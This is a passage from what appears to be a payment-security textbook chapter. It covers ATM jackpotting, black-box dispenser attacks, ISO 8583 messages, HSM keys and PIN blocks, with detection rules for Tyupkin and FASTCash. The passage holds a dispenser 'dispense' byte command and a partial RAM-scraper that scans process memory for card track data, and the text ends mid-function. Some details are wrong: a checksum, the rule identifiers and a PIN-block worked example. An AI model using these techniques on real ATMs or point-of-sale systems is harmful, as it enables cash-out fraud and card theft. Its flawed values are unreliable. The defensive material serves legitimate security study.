**Indicators of compromise.** (1) Unexplained `.so` files in the payment switch's library directories, with creation timestamps outside maintenance windows. (2) `LD_PRELOAD` environment variable set on the switch process. (3) Authorization response latency dropping to near-zero for specific PANs. (4) Transaction approval patterns where the same PANs are approved across geographically dispersed ATMs within a short time window (simultaneous withdrawals in multiple countries). (5) Reconciliation discrepancies between ATM journal logs (showing dispensed cash) and core banking records (no corresponding debit transactions). (6) Network connections from the switch server to unexpected external IPs (C2 communication for receiving updated target PAN lists).

### 2.4 Black-box attacks

The attacker opens the top hat, disconnects the dispenser's communication cable from the ATM's PC I/O board, and connects their own device (the "black box") directly to the cable. The black box sends commands to the dispenser's controller, which dispenses cash.

**Dispenser protocols.** NCR dispensers use a proprietary serial protocol. Diebold dispensers use a proprietary USB or serial protocol. The black-box attacker must know (or reverse-engineer) the dispenser's command set. This information is available in service manuals (sometimes leaked), in XFS Service Provider DLLs (reverse-engineering the SP reveals the commands it sends to the hardware), and in documentation obtained from insiders.

**NCR S1/S2 dispenser protocol details.** NCR's older dispensers (S1 generation) use an unencrypted serial protocol where commands are structured as: a start byte (`0x02` — STX), a command code (e.g., `0x44` for dispense, `0x53` for status query), command-specific parameters (cassette number, note count), a checksum byte (XOR of all preceding bytes), and an end byte (`0x03` — ETX). A black box that sends `02 44 01 28 6D 03` (STX, dispense command, cassette 1, 40 notes, XOR checksum, ETX) will dispense 40 notes from cassette 1. The S2 generation introduced encrypted communication — the PC must authenticate to the dispenser using a challenge-response protocol (the dispenser sends a random nonce, the PC signs it with a shared AES-256 key, and the dispenser verifies the signature before accepting commands). Without the key, a black box receives a challenge it cannot answer and the dispenser rejects all subsequent commands.

**Black-box device detection.** ATMs can detect black-box attachment through several mechanisms: (1) **Heartbeat monitoring** — the ATM PC periodically polls the dispenser; if the dispenser stops responding (because the cable has been disconnected from the PC and connected to the black box), the ATM generates a tamper alert. (2) **Physical tamper switches** on the cable connectors — opening the cable compartment or disconnecting the cable triggers an alarm. (3) **Encrypted dispenser communication** (described above) — the black box cannot authenticate and the dispenser remains inert. (4) **Dispenser firmware validation** — on boot, the dispenser validates its firmware integrity; a modified firmware (that an attacker might install to disable encryption) fails the integrity check and the dispenser refuses to operate.

**Encrypted dispenser communication.** The defense: the ATM PC and the dispenser share a symmetric key. The PC authenticates to the dispenser (proving it is the legitimate ATM) before the dispenser accepts commands. The session key encrypts command and response data. A black box that does not possess the key cannot authenticate and is rejected by the dispenser.

NCR's "S1 Secure Dispenser" and Diebold's "ActivEdge" implement encrypted communication. However, deploying encrypted dispensers requires: hardware upgrade (older dispensers don't support encryption), key management (provisioning unique keys per ATM), and software updates (the ATM application and XFS SP must support the encrypted protocol).

### 2.5 Tyupkin

**Overview.** Tyupkin (discovered 2014, Kaspersky Lab analysis) is an ATM jackpotting malware that was deployed on ATMs running Windows 32-bit. The attacker gained physical access to the ATM, booted from a CD (older ATMs did not have boot-device restrictions), and installed Tyupkin on the ATM's hard drive.

**Time-windowed activation.** Tyupkin's distinguishing feature is its activation schedule. The malware only accepts dispensing commands during a specific time window — Sunday and Monday nights between 00:00 and 05:00. Outside this window, the malware is dormant and does not respond to keyboard input. This reduces the detection window: the malware is active only during low-traffic hours when the absence of legitimate ATM usage makes the mule's activity less conspicuous, and ATM monitoring teams are typically understaffed.

**Activation sequence.** During the active time window, the mule presses a specific key combination on the ATM's function keys. Tyupkin displays an 8-digit session key on the screen. The mule calls the controller (the person coordinating the operation remotely), provides the session key, and receives a response code (computed by the controller using a shared algorithm). The mule enters the response code, and Tyupkin enables dispensing. This two-factor activation (time window + challenge-response) prevents opportunistic use by unauthorized persons who discover the infected ATM.

**Detection via Windows Event Logs.** Tyupkin's CD-boot installation and service registration leave specific artifacts in Windows Event Logs. The System log records an unexpected boot source (Event ID 12 — "The operating system started at system time..."), and the Application log records the registration of a new service during the installation. A Sigma rule targeting these artifacts:

```yaml
title: Tyupkin ATM Malware Installation Indicators
id: d6fa04c3-7e5g-4d2b-bc4f-9a5h6i7j8k9l
status: experimental
description: Detects ATM boot from removable media and subsequent suspicious service creation
date: 2024-01-15
logsource:
    product: windows
    service: system
detection:
    selection_boot:
        EventID: 12
        Provider_Name: 'Microsoft-Windows-Kernel-General'
    selection_service:
        EventID: 7045
        ServiceName|contains:
            - 'ulssm'      # known Tyupkin service name
            - 'AptraDebug'  # variant service name
        ServiceFileName|contains: '.exe'
    condition: selection_boot or selection_service
level: critical
```

### 2.6 ATM malware detection: EDR and Sysmon configuration

Deploying standard EDR solutions on ATMs requires careful configuration — ATM environments have stability requirements that prohibit heavy scanning or real-time behavioral analysis that could introduce latency in transaction processing. The recommended approach:

**Sysmon configuration for ATM environments.** Deploy Sysmon with a custom configuration that focuses on ATM-relevant events while minimizing performance impact:

```xml
<Sysmon schemaversion="4.90">
    <EventFiltering>
        <!-- Log all process creation events — critical for detecting
             unauthorized executables on a whitelisted system -->
        <ProcessCreate onmatch="include">
            <Rule groupRelation="or">
                <ParentImage condition="contains">msxfs</ParentImage>
                <Image condition="contains any">cmd.exe;powershell.exe;cscript.exe;wscript.exe</Image>
                <Image condition="excludes">\APTRA\;\Agilis\;\MoniMax\</Image>
            </Rule>
        </ProcessCreate>

        <!-- Log DLL loads of XFS components by unexpected processes -->
        <ImageLoad onmatch="include">
            <ImageLoaded condition="contains">msxfs.dll</ImageLoaded>
        </ImageLoad>

        <!-- Log new service installations -->
        <RegistryEvent onmatch="include">
            <TargetObject condition="contains">CurrentControlSet\Services</TargetObject>
            <EventType condition="is">CreateKey</EventType>
        </RegistryEvent>

        <!-- Log USB device connections -->
        <PnPDeviceConnected onmatch="include" />

        <!-- Log network connections from non-ATM-app processes -->
        <NetworkConnect onmatch="include">
            <Image condition="excludes">\APTRA\;\Agilis\;\MoniMax\</Image>
        </NetworkConnect>
    </EventFiltering>
</Sysmon>
```

**YARA rule for XFS-calling binaries.** A generic rule that flags any binary importing XFS functions that is not a known legitimate ATM component:

```yara
import "pe"

rule Suspicious_XFS_Binary {
    meta:
        description = "Detects PE binaries that import XFS API functions"
        date        = "2024-01-15"
    strings:
        $import_startup   = "WFSStartUp" ascii wide
        $import_open      = "WFSOpen" ascii wide
        $import_execute   = "WFSExecute" ascii wide
        $import_getinfo   = "WFSGetInfo" ascii wide
        $import_async     = "WFSAsyncExecute" ascii wide
        $dll_ref          = "msxfs.dll" ascii wide nocase
    condition:
        uint16(0) == 0x5A4D and
        $dll_ref and
        2 of ($import_startup, $import_open, $import_execute, $import_getinfo, $import_async) and
        not (
            // Whitelist known legitimate ATM binaries by PE metadata
            pe.version_info["CompanyName"] contains "NCR" or
            pe.version_info["CompanyName"] contains "Diebold" or
            pe.version_info["CompanyName"] contains "Hyosung" or
            pe.version_info["CompanyName"] contains "Wincor"
        )
}
```

### 2.7 ATM network attacks

**Man-in-the-middle between ATM and host.** If the ATM-to-host communication is unencrypted (no TLS/IPsec), an attacker on the same network segment can intercept and modify messages. For NDC-based ATMs, the attacker intercepts the host's "Transaction Reply" and modifies the dispense amount. For ISO 8583-based ATMs, the attacker modifies the authorization response (DE39 and DE4). The attack requires: physical access to the ATM's network (tapping the Ethernet cable in the ATM's top hat, or compromising the network switch/router serving the ATM).

**TLS stripping.** If the ATM's TLS implementation does not enforce certificate pinning or strict hostname validation, the attacker performs a TLS-stripping or certificate-substitution attack. The attacker's device presents a self-signed or fraudulently obtained certificate to the ATM. If the ATM accepts it, the attacker has a cleartext view of all NDC/ISO 8583 traffic and can modify it at will. Defense: the ATM application must validate the host's TLS certificate against a pinned CA or certificate fingerprint. The ATM should refuse to operate if certificate validation fails (rather than falling back to an unencrypted connection).

### 2.8 Defense summary per attack type

| Attack | Primary Defense | Secondary Defense | Monitoring |
|--------|----------------|-------------------|------------|
| Ploutus.D / Cutlet Maker | Application whitelisting (block unsigned executables) | Encrypted dispenser (block XFS calls from unauthorized software) | YARA scanning, Sysmon DLL-load monitoring |
| FASTCash | Network segmentation of payment switch, integrity monitoring on switch binaries | Multi-factor authorization verification (switch validates with core banking) | Transaction latency monitoring, reconciliation alerts |
| Black-box | Encrypted dispenser communication (S2/ActivEdge) | Physical tamper detection on cable compartment | Heartbeat loss alerts, physical tamper switch alarms |
| Tyupkin | BIOS boot-device restriction, Secure Boot | Application whitelisting, FDE | Event log monitoring for unexpected boots, service creation |
| Skimming | Anti-skimming jitter, fascia design | Contactless/EMV-only mode (disable mag-stripe) | Card-reader tamper sensors, CCTV analytics |
| Network MITM | Mandatory TLS with certificate pinning | IPsec VPN to host | TLS handshake failure alerts, traffic anomaly detection |

### 2.9 Skimming and shimming

**Overlay skimmer.** A plastic fascia placed over the card-reader slot. Inside: a magnetic-stripe read head that captures Track 1/2 data as the card passes through. The skimmer stores data on an internal flash chip; the attacker retrieves it later (physically or via Bluetooth — BLE skimmers broadcast captured data to a nearby phone). Detection: the overlay may be loose, misaligned, or a different color than the ATM's original fascia. Anti-skimming jitter (the card reader vibrates the card during insertion, disrupting the skimmer's read head alignment) is deployed on newer ATMs.

**Deep-insert skimmer.** A thin, flexible PCB inserted into the card reader's throat (inside the card slot). The skimmer sits inside the reader, invisible from outside. The read head captures Track 2 (Track 2 is on the back of the card, closest to the reader's throat). Deep-insert skimmers are extremely difficult to detect visually; detection requires physical inspection of the card reader's interior.

**Shimmer.** A paper-thin flexible PCB inserted into the chip-card slot. The shim sits between the card's chip contacts and the reader's contacts, intercepting all APDU communication. The shim captures: PAN, expiration date, and EMV data (which cannot be used to clone a chip but can be used to create a counterfeit magnetic stripe if the PAN and expiration are the same on chip and stripe — which they typically are). Some advanced shims perform the CVM-bypass attack (modifying the CVM List, §Chapter 22A §6.3).

---

## 3. ISO 8583 in depth

### 3.1 Message structure

An ISO 8583 message consists of:

**Message Type Indicator (MTI, 4 digits/2 bytes).** First digit: version (`0` = 1987, `1` = 1993, `2` = 2003). Second digit: message class (`1` = authorization, `2` = financial, `4` = reversal, `8` = network management). Third digit: message function (`0` = request, `1` = response, `2` = advice, `3` = advice response). Fourth digit: message origin (`0` = acquirer, `1` = acquirer repeat, `2` = issuer, `3` = issuer repeat).

Example MTIs: `0100` (authorization request from acquirer), `0110` (authorization response from issuer), `0200` (financial request — the actual transaction), `0210` (financial response), `0420` (reversal request), `0430` (reversal response), `0800` (network management request — sign-on, key exchange), `0810` (network management response).

**Bitmap (8 or 16 bytes).** A 64-bit (primary) or 128-bit (primary + secondary) bitmap. Each bit indicates the presence of the corresponding data element. Bit 1 = secondary bitmap present. Bit 2 = DE2 (PAN). Bit 3 = DE3 (Processing Code). Bit 4 = DE4 (Amount, Transaction). And so on through bit 128.

**Data elements.** Each present data element follows, in numerical order. Key security-relevant DEs:

**DE2** (PAN, up to 19 digits, variable length): the card number. **DE3** (Processing Code, 6 digits): transaction type (00 = purchase, 01 = cash, 20 = refund). **DE4** (Amount, Transaction, 12 digits): the amount in the smallest currency unit (cents for USD). **DE11** (STAN — Systems Trace Audit Number, 6 digits): a unique transaction identifier for reconciliation. **DE14** (Expiration Date, 4 digits YYMM). **DE22** (POS Entry Mode, 3 digits): how the card data was captured (05 = chip, 07 = contactless, 02 = magnetic stripe, 01 = manual key entry). **DE23** (PAN Sequence Number): distinguishes multiple cards on the same PAN. **DE25** (POS Condition Code, 2 digits): the transaction environment (00 = normal, 51 = available funds inquiry, 08 = mail/telephone order).

**DE35** (Track 2 Data, variable): the full Track 2 magnetic-stripe data. Present for mag-stripe transactions; for EMV, may contain the Track 2 Equivalent Data from the chip. **DE38** (Authorization Identification Response, 6 chars): the authorization code assigned by the issuer. **DE39** (Response Code, 2 digits): `00` = approved, `05` = do not honor, `14` = invalid card, `51` = insufficient funds, `54` = expired, `55` = incorrect PIN.

**DE41** (Card Acceptor Terminal ID, 8 chars): identifies the specific terminal. **DE42** (Card Acceptor ID, 15 chars): identifies the merchant. **DE52** (PIN Data, 8 bytes): the encrypted PIN block (§Chapter 22A §4). **DE55** (ICC Related Data, variable, up to 999 bytes): contains the EMV chip data as TLV-encoded data elements — the ARQC (tag `0x9F26`), ATC (`0x9F36`), TVR (`0x95`), CVM Results, AIP (`0x82`), IAD (`0x9F10`), and other EMV tags. DE55 is the bridge between the EMV transaction (Chapter 22A) and the ISO 8583 authorization message.

### 3.2 ISO 8583 message parsing code

The following Python code demonstrates constructing and parsing an ISO 8583 authorization request — the kind of message an ATM or POS terminal sends to the acquirer:

```python
"""
ISO 8583 message construction and parsing.
Demonstrates building an authorization request (MTI 0100) and
parsing the response — the core of ATM/POS-to-switch communication.
"""
from py8583 import ISO8583, DT, LT, ContentType
import struct

# Field specification — 1987 version
SPEC = {
    2:  {"ContentType": ContentType.N,  "MaxLen": 19, "LenType": LT.LLVAR,  "Description": "PAN"},
    3:  {"ContentType": ContentType.N,  "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "Processing Code"},
    4:  {"ContentType": ContentType.N,  "MaxLen": 12, "LenType": LT.FIXED,  "Description": "Amount"},
    11: {"ContentType": ContentType.N,  "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "STAN"},
    12: {"ContentType": ContentType.N,  "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "Local Time"},
    13: {"ContentType": ContentType.N,  "MaxLen": 4,  "LenType": LT.FIXED,  "Description": "Local Date"},
    14: {"ContentType": ContentType.N,  "MaxLen": 4,  "LenType": LT.FIXED,  "Description": "Expiration Date"},
    22: {"ContentType": ContentType.N,  "MaxLen": 3,  "LenType": LT.FIXED,  "Description": "POS Entry Mode"},
    23: {"ContentType": ContentType.N,  "MaxLen": 3,  "LenType": LT.FIXED,  "Description": "PAN Sequence Number"},
    25: {"ContentType": ContentType.N,  "MaxLen": 2,  "LenType": LT.FIXED,  "Description": "POS Condition Code"},
    35: {"ContentType": ContentType.Z,  "MaxLen": 37, "LenType": LT.LLVAR,  "Description": "Track 2 Data"},
    38: {"ContentType": ContentType.AN, "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "Auth Code"},
    39: {"ContentType": ContentType.AN, "MaxLen": 2,  "LenType": LT.FIXED,  "Description": "Response Code"},
    41: {"ContentType": ContentType.ANS,"MaxLen": 8,  "LenType": LT.FIXED,  "Description": "Terminal ID"},
    42: {"ContentType": ContentType.ANS,"MaxLen": 15, "LenType": LT.FIXED,  "Description": "Merchant ID"},
    52: {"ContentType": ContentType.B,  "MaxLen": 8,  "LenType": LT.FIXED,  "Description": "PIN Data"},
    55: {"ContentType": ContentType.B,  "MaxLen": 999,"LenType": LT.LLLVAR, "Description": "ICC Related Data"},
    64: {"ContentType": ContentType.B,  "MaxLen": 8,  "LenType": LT.FIXED,  "Description": "MAC"},
}

def build_auth_request() -> bytes:
    """Build an ATM cash-withdrawal authorization request."""
    msg = ISO8583(IsoSpec=SPEC)
    msg.setMTI("0100")
    msg.setBit(2,  "4111111111111111")         # PAN
    msg.setBit(3,  "011000")                    # Processing code: cash withdrawal
    msg.setBit(4,  "000000010000")              # Amount: $100.00 (10000 cents)
    msg.setBit(11, "123456")                    # STAN
    msg.setBit(12, "143052")                    # Time: 14:30:52
    msg.setBit(13, "0115")                      # Date: Jan 15
    msg.setBit(14, "2612")                      # Expiration: Dec 2026
    msg.setBit(22, "051")                       # POS Entry Mode: chip, PIN capable
    msg.setBit(25, "00")                        # POS Condition: normal
    msg.setBit(41, "ATM00001")                  # Terminal ID
    msg.setBit(42, "BANK_BRANCH_001")           # Merchant ID
    # DE52 (PIN block) and DE55 (EMV data) would be set from
    # the EPP and chip card respectively
    return msg.getNetworkISO()

def parse_auth_response(raw: bytes) -> dict:
    """Parse an authorization response and extract key fields."""
    msg = ISO8583(raw, SPEC)
    return {
        "mti":           msg.getMTI(),
        "pan":           msg.getBit(2),
        "response_code": msg.getBit(39),
        "auth_code":     msg.getBit(38),
        "amount":        msg.getBit(4),
    }
```

### 3.3 DE55 (EMV chip data) TLV parsing

DE55 carries EMV chip data encoded in BER-TLV (Basic Encoding Rules — Tag-Length-Value). Parsing DE55 is essential for validating EMV cryptograms on the issuer/switch side:

```python
"""
BER-TLV parser for ISO 8583 DE55 (ICC Related Data).
Extracts EMV tags such as ARQC (9F26), ATC (9F36), TVR (95), etc.
"""
def parse_tlv(data: bytes) -> dict[str, bytes]:
    """Parse BER-TLV encoded data into a dict of {tag_hex: value}."""
    result = {}
    i = 0
    while i < len(data):
        # --- Parse tag ---
        tag_start = i
        tag_byte = data[i]
        i += 1
        # If lower 5 bits of first byte are all 1s, tag is multi-byte
        if (tag_byte & 0x1F) == 0x1F:
            while i < len(data) and (data[i] & 0x80):
                i += 1  # continuation bytes have bit 8 set
            i += 1      # final tag byte (bit 8 clear)
        tag = data[tag_start:i].hex().upper()

        # --- Parse length ---
        if i >= len(data):
            break
        length_byte = data[i]
        i += 1
        if length_byte <= 0x7F:
            length = length_byte
        elif length_byte == 0x81:
            length = data[i]
            i += 1
        elif length_byte == 0x82:
            length = (data[i] << 8) | data[i + 1]
            i += 2
        else:
            break  # unsupported length encoding

        # --- Parse value ---
        value = data[i:i + length]
        i += length

        result[tag] = value

    return result

# EMV tag definitions relevant to authorization
EMV_TAGS = {
    "9F26": "Application Cryptogram (ARQC/TC/AAC)",
    "9F27": "Cryptogram Information Data (CID)",
    "9F10": "Issuer Application Data (IAD)",
    "9F36": "Application Transaction Counter (ATC)",
    "9F37": "Unpredictable Number",
    "95":   "Terminal Verification Results (TVR)",
    "9A":   "Transaction Date",
    "9C":   "Transaction Type",
    "5F2A": "Transaction Currency Code",
    "82":   "Application Interchange Profile (AIP)",
    "9F02": "Amount Authorized",
    "9F03": "Amount Other",
    "9F1A": "Terminal Country Code",
    "9F34": "CVM Results",
    "9F35": "Terminal Type",
    "9F33": "Terminal Capabilities",
}

def decode_de55(de55_bytes: bytes) -> None:
    """Parse and display the EMV tags within DE55."""
    tags = parse_tlv(de55_bytes)
    for tag_hex, value in tags.items():
        name = EMV_TAGS.get(tag_hex, "Unknown")
        print(f"  Tag {tag_hex} ({name}): {value.hex()}")

        # Decode specific tags
        if tag_hex == "9F27":  # CID — tells us cryptogram type
            cid = value[0]
            ctype = {0x80: "ARQC", 0x40: "TC", 0x00: "AAC"}.get(cid & 0xC0, "RFU")
            print(f"    → Cryptogram type: {ctype}")
        elif tag_hex == "9F36":  # ATC
            atc = int.from_bytes(value, "big")
            print(f"    → ATC value: {atc}")
        elif tag_hex == "95":    # TVR
            tvr_bits = ''.join(f'{b:08b}' for b in value)
            print(f"    → TVR bits: {tvr_bits}")
```

### 3.4 HSM key management hierarchy

Hardware Security Modules (HSMs — typically Thales payShield or Atalla series in payment networks) manage the cryptographic key hierarchy that secures ISO 8583 message authentication and PIN encryption:

**Key hierarchy (top to bottom):**

**Zone Master Key (ZMK) / Key Encrypting Key (KEK).** The top of the hierarchy. Used exclusively to encrypt other keys during key exchange between entities (e.g., between the acquirer and the card network). The ZMK is loaded into the HSM via split-knowledge, dual-control procedures (two or more key custodians each enter a key component; the HSM combines them internally — no single person knows the full key). ZMKs are never used to encrypt data — only keys.

**Terminal Master Key (TMK).** Specific to each terminal (ATM or POS). The TMK is used to encrypt session keys that the host sends to the terminal. The TMK is injected into the terminal during deployment (physically, using a secure key-injection device that connects to the terminal, or remotely via Remote Key Loading — RKL — encrypted under the ZMK).

**Terminal Session Key (TSK) / Working Keys.** Derived from or encrypted under the TMK. These are the keys actually used for transaction-level operations. The host sends new working keys to the terminal periodically (e.g., daily) via a key-exchange message (MTI `0800`). Working keys include:

- **Terminal PIN Encryption Key (TPK):** Used by the EPP to encrypt the PIN block. The EPP receives the TPK (encrypted under the TMK) from the host during key exchange, decrypts it using the TMK stored in the EPP's tamper-resistant memory, and uses the TPK to encrypt each PIN block during transactions.
- **Terminal Authentication Key (TAK) / MAC Key:** Used to compute the MAC on ISO 8583 messages (DE64/DE128). The MAC key ensures message integrity — any modification of the message in transit invalidates the MAC.

**DUKPT (Derived Unique Key Per Transaction).** An alternative to the TMK/TSK model, primarily used in POS environments. Instead of the host sending session keys to the terminal, the terminal derives a unique key for each transaction from a Base Derivation Key (BDK). The derivation uses the Key Serial Number (KSN), which includes a transaction counter. The terminal never stores the BDK — only the Initial PIN Encryption Key (IPEK), derived from the BDK during key injection. Each transaction increments the counter and derives a new key, ensuring that no two transactions use the same key and that compromise of one transaction key does not expose any other. The host (or its HSM) uses the KSN and the BDK to derive the same key and decrypt the PIN block.

### 3.5 MAC computation example

The MAC on ISO 8583 messages is computed using 3DES-CBC (Triple DES in Cipher Block Chaining mode) or, increasingly, AES-CMAC. The following demonstrates 3DES-CBC MAC computation:

```python
"""
3DES-CBC MAC computation for ISO 8583 message authentication (DE64).
The MAC is computed over the entire message (excluding the MAC field)
using the Terminal Authentication Key (TAK).
"""
from Crypto.Cipher import DES3
from Crypto.Util.Padding import pad

def compute_iso8583_mac(message_bytes: bytes, tak: bytes) -> bytes:
    """
    Compute a 3DES-CBC MAC over the ISO 8583 message.
    Args:
        message_bytes: The raw ISO 8583 message (MTI + bitmap + data elements),
                       EXCLUDING the MAC field itself.
        tak: The 16-byte (2-key 3DES) or 24-byte (3-key 3DES)
             Terminal Authentication Key.
    Returns:
        8-byte MAC value (to be placed in DE64 or DE128).
    """
    # ISO 9797-1 MAC Algorithm 1 (CBC-MAC):
    # Pad the message to a multiple of 8 bytes (DES block size)
    padded = pad(message_bytes, 8, style='iso7816')

    # Encrypt in CBC mode with a zero IV
    iv = b'\x00' * 8
    cipher = DES3.new(tak, DES3.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded)

    # The MAC is the last 8 bytes of the CBC output
    # (the final ciphertext block, which chains all previous blocks)
    mac = ciphertext[-8:]
    return mac

# Example
tak = bytes.fromhex("0123456789ABCDEFFEDCBA9876543210")  # 16-byte 2-key 3DES
msg = bytes.fromhex("0100723A000000C0800016411111111111111100110000000100001234561430520115")
mac = compute_iso8583_mac(msg, tak)
print(f"MAC: {mac.hex()}")
```

### 3.6 PIN block construction — ISO 9564-1 Format 0

The PIN block encrypts the cardholder's PIN for transmission in DE52. Format 0 (the most common format) XORs two 8-byte fields:

**PIN field construction:** `0 | L | P P P P P P P P P P P P P P` where `0` is the format code (Format 0), `L` is the PIN length (1 hex digit, 4–12), and `P` is the PIN digit. Unused positions are filled with `F` (hex).

**PAN field construction:** `0 0 0 0 | rightmost 12 PAN digits excluding the check digit`. The check digit is the last digit of the PAN (Luhn check digit). So for a 16-digit PAN, take digits 4–15 (0-indexed), which are positions 3 through 14 of the PAN.

**PIN block = PIN field XOR PAN field.**

```python
"""
ISO 9564-1 Format 0 PIN block construction.
"""

def format0_pin_block(pin: str, pan: str) -> bytes:
    """
    Construct a Format 0 PIN block.
    Args:
        pin: The cleartext PIN (4-12 digits)
        pan: The full PAN (13-19 digits)
    Returns:
        8-byte PIN block (to be encrypted with the TPK before
        placing in DE52)
    """
    # --- PIN field ---
    pin_len = len(pin)
    pin_field_hex = f"0{pin_len:X}{pin}{'F' * (14 - pin_len)}"

    # --- PAN field ---
    # Take rightmost 13 PAN digits, drop the check digit (last one),
    # yielding 12 digits, then prepend "0000"
    pan_digits = pan[:-1]       # drop check digit
    pan_right12 = pan_digits[-12:]  # rightmost 12
    pan_field_hex = f"0000{pan_right12}"

    # --- XOR ---
    pin_field_bytes = bytes.fromhex(pin_field_hex)
    pan_field_bytes = bytes.fromhex(pan_field_hex)
    pin_block = bytes(a ^ b for a, b in zip(pin_field_bytes, pan_field_bytes))

    return pin_block

# Example: PIN = "1234", PAN = "4111111111111111"
pin_block = format0_pin_block("1234", "4111111111111111")
# PIN field:  04 12 34 FF FF FF FF FF  →  0x041234FFFFFFFFFF
# PAN field:  00 00 41 11 11 11 11 11  →  0x0000411111111111
# XOR result: 04 12 75 EE EE EE EE EE  →  0x041275EEEEEEEEEE
print(f"PIN block: {pin_block.hex()}")
```

The resulting PIN block is then encrypted with the Terminal PIN Encryption Key (TPK) using 3DES before being placed in DE52. The issuer's HSM decrypts DE52 using the corresponding TPK (derived from the TMK or DUKPT BDK) and compares the PIN against the stored reference.

### 3.7 Transaction manipulation attacks and detection

**Replay attacks.** An attacker captures a valid ISO 8583 authorization request (MTI `0100`) and replays it to the switch. If the switch does not enforce STAN uniqueness (DE11), the replayed message is processed as a new transaction, resulting in a duplicate charge or withdrawal. Defense: the switch must maintain a sliding window of recently-processed STANs per terminal and reject duplicates. The STAN combined with DE12 (time) and DE13 (date) forms a uniqueness key.

**Amount manipulation.** An attacker with network access between the terminal and acquirer modifies DE4 (Amount) in the authorization request — for example, changing a $10 withdrawal to $1,000. If the message MAC (DE64) is not validated end-to-end, the modification goes undetected. Defense: mandatory MAC validation on all messages, with the MAC key securely managed via HSM.

**Response code manipulation.** The attacker intercepts the authorization response and changes DE39 from `51` (insufficient funds) to `00` (approved). Without MAC validation, the terminal accepts the spoofed approval and completes the transaction. Defense: MAC on responses, with the terminal validating the MAC before acting on the response.

### 3.8 Network-level monitoring for ISO 8583 anomalies

A Sigma rule for detecting anomalous ISO 8583 patterns at the switch level:

```yaml
title: Anomalous ISO 8583 Authorization Patterns
id: e7fb15d4-8g6h-4e3c-cd5g-0b6i7j8k9l0m
status: experimental
description: Detects potential FASTCash or replay attacks via ISO 8583 anomaly patterns
date: 2024-01-15
logsource:
    category: application
    product: payment_switch
detection:
    # Pattern 1: High volume of approvals from a single PAN across many terminals
    selection_high_approval:
        mti: '0110'
        response_code: '00'
    filter_velocity:
        pan|count: '>10'
    timeframe: 15m

    # Pattern 2: Zero-latency responses (FASTCash indicator)
    selection_instant_response:
        mti: '0110'
        response_latency_ms: '<5'

    # Pattern 3: MTI sequence violations (response without matching request)
    selection_orphan_response:
        mti: '0110'
        matching_request: 'false'

    condition: (selection_high_approval and filter_velocity) or
               selection_instant_response or
               selection_orphan_response
level: critical
tags:
    - attack.collection
    - attack.t1565.002
```

### 3.9 Message authentication

ISO 8583 messages between the terminal and the acquirer are authenticated using a MAC (Message Authentication Code) in **DE64** (primary MAC) or **DE128** (secondary MAC). The MAC is computed over the entire message (excluding the MAC field itself) using a symmetric key shared between the terminal and the acquirer (the terminal master key, from which session keys are derived).

The MAC prevents message tampering in transit — an attacker who MitMs the terminal-acquirer connection cannot modify the transaction amount, PAN, or response code without invalidating the MAC. The MAC key is typically 3DES or AES, managed via the terminal's key hierarchy (injected during terminal deployment and rotated via host-initiated key exchange — MTI `0800` with a key-change command).

---

## 4. POS RAM scrapers — expanded

### 4.1 Target: in-memory card data

During a magnetic-stripe transaction, the POS application reads Track 1 and Track 2 data from the card reader. This data passes through the application's memory in cleartext (before being encrypted for transmission to the acquirer in a P2PE environment, or in some cases remaining in cleartext if P2PE is not implemented). The window of cleartext exposure is brief (milliseconds to seconds during transaction processing), but RAM scraper malware scans continuously and captures the data during this window.

**Track 1 format (IATA, up to 79 characters):** `%B` (sentinel) + PAN (up to 19 digits) + `^` (separator) + Cardholder Name (up to 26 chars) + `^` (separator) + Expiration Date (YYMM) + Service Code (3 digits) + Discretionary Data (PVV, CVV, etc.) + `?` (end sentinel) + LRC (Longitudinal Redundancy Check — XOR of all characters).

**Track 2 format (ABA, up to 40 characters):** `;` (sentinel) + PAN (up to 19 digits) + `=` (separator) + Expiration Date (YYMM) + Service Code + Discretionary Data + `?` (end sentinel) + LRC.

RAM scrapers search for these patterns in process memory using regex-like matching: a string of 13–19 digits (PAN — passes Luhn check), followed by the separator and expiration date in the expected format.

### 4.2 RAM scraping technique — code demonstration

The following demonstrates the core technique RAM scrapers use — scanning a target process's memory for Track data patterns. This uses the Windows API via `ctypes` to enumerate memory regions and search for Track 2 patterns:

```python
"""
RAM scraping technique demonstration — process memory scanning
for Track 2 data patterns.  This is the core mechanism used by
BlackPOS, Dexter, Alina, and FrameworkPOS.
"""
import ctypes
from ctypes import wintypes
import re
import struct

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Windows constants
PROCESS_VM_READ         = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT              = 0x1000
PAGE_READWRITE          = 0x04
PAGE_READONLY           = 0x02

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress",       ctypes.c_void_p),
        ("AllocationBase",    ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize",        ctypes.c_size_t),
        ("State",             wintypes.DWORD),
        ("Protect",           wintypes.DWORD),
        ("Type",              wintypes.DWORD),
    ]

# --- Regex patterns for Track data ---
# Track 1: %B followed by 13-19 digits, ^, name, ^, YYMM, 3-digit service code
TRACK1_PATTERN = re.compile(
    rb'%B(\d{13,19})\^([A-Z /.]{2,26})\^(\d{4})(\d{3})'
)

# Track 2: ; followed by 13-19 digits, =, YYMM, 3-digit service code
TRACK2_PATTERN = re.compile(
    rb';(\d{13,19})=(\d{4})(\d{3})'
)

def luhn_check(pan: str) -> bool:
    """Validate PAN using the Luhn algorithm."""
    digits = [int(d) for d in pan]
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

def scan_process_memory(pid: int) -> list[dict]:
    """Scan a process's memory for Track 1 and Track 2 data."""
    found_tracks = []

    handle = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid
    )
    if not handle:
        return found_tracks

    mbi = MEMORY_BASIC_INFORMATION()
    address = 0
    buf = ctypes.create_string_buffer(4096)

    while kernel32.VirtualQueryEx(handle, address, ctypes.byref(mbi),
                                   ctypes.sizeof(mbi)):
        # Only scan committed, readable memory regions
        if (mbi.State == MEM_COMMIT and
            mbi.Protect in (PAGE_READWRITE, PAGE_READONLY)):

            # Read the region in 4KB chunks
            region_end = mbi.BaseAddress + mbi.RegionSize
